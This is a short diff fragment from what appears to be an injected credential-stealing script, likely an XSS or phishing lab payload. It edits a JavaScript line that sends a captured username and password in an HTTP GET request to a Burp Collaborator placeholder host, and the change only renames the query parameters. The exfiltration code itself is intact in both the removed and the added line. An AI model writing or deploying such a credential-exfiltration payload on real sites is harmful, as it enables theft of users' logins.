@@ -33,7 +33,7 @@
             
             // Send the captured data to Burp Collaborator via HTTP GET request
             var xhr = new XMLHttpRequest();
-            xhr.open("GET", "http://<BURP_COLLABORATOR_URL>/?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password), true);
+            xhr.open("GET", "http://<BURP_COLLABORATOR_URL>/?user=" + encodeURIComponent(username) + "&pass=" + encodeURIComponent(password), true);
             xhr.send();
         }
     </script>
